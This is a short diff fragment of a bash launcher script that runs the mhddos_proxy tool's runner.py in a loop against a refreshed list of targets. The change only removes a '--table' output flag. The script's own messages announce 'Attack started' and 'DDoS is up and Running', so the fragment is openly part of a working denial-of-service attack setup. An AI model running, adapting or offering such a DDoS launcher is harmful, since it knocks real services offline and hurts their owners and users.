@@ -81,7 +81,7 @@ do
             #echo $cmd_line
             #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
-            python runner.py --table $cmd_line $proxy_interval $rpc&    ##$threads
+            python runner.py $cmd_line $proxy_interval $rpc&    ##$threads
             echo -e "Attack started. Wait a few minutes for output"
    done
 echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
